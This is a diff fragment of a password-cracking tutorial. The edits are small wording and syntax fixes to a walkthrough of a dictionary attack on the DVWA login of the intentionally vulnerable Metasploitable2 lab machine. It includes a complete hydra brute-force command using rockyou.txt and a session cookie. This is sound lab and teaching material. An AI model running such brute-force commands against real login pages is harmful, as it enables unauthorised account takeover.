@@ -96,7 +96,7 @@ Dictionary attacks utilise a dictionary where every word is used to guess the pa
 
 These dictionaries may include different languages and common passwords to save time. These types of attacks are used when trying to exploit weak passwords (commonly used). As a result of this laziness, dictionary attacks are often quite successful. 
 
-Here is an example of a dictionary attack on an intentionally vulnerable machine “Metasploitable2”. In this scenario, we are presented with a web login on DVWA (Damn Vulnerable Web Application). 
+Here is an example of a dictionary attack on an intentionally vulnerable system “Metasploitable2”. In this scenario, we are presented with a web login on DVWA (Damn Vulnerable Web Application). 
 
 1 - Make sure you have DVWA set up to low. 
 
@@ -125,7 +125,7 @@ Proxy > Intercept
 
 7 - Now construct the hydra command:
 
-<pre> hydra [host] -l [user] -P [passwordlist] http-get-form “ [username ^USER^ password ^PASS^ ] : F=[<Failed Message] : H=Cookie: [Cookie Value]” </pre>
+<pre> hydra [host] -l [user] -P [passwordlist] http-get-form “ [username ^USER^ password ^PASS^ ] : F=[Failed Message] : H=Cookie: [Cookie Value]” </pre>
 
 <pre> hydra 192.168.56.118 -l admin -P "/usr/share/wordlists/rockyou.txt" http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=b39e1a2e30e1ce45c5927951e84aa52c" </pre>
 
